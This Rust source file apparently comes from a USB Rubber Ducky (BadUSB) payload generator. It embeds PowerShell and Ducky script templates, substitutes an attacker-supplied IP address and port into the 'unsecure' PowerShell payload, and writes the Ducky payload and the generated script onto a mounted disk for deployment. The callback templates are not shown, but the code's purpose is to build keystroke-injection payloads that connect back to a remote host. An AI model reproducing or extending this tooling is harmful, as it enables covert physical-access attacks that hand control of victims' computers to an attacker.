use sysinfo::Disk;

static PAYLOAD_SECURE: &'static str = include_str!("./templates/payload_secure.ps1");
static PAYLOAD_UNSECURE: &'static str = include_str!("./templates/payload_unsecure.ps1");
static DUCKY_PAYLOAD: &'static str = include_str!("./templates/payload.dd");

#[derive(Clone, Copy)]
pub enum PayloadType {
    SECURE,
    UNSECURE,
}

fn generate_payload<A: ToString, P: ToString>(addr: A, port: P) -> String {
    PAYLOAD_UNSECURE
        .replace("#IP_ADDRESS", &addr.to_string())
        .replace("#PORT", &port.to_string())
}

pub fn flash_disk<A: ToString, P: ToString>(disk: &Disk, addr: A, port: P) -> std::io::Result<()> {
    std::fs::write(disk.mount_point().join("payload.dd"), DUCKY_PAYLOAD)?;
    std::fs::write(
        disk.mount_point().join("script.ps1"),
        generate_payload(addr, port),
    )?;
    Ok(())
}
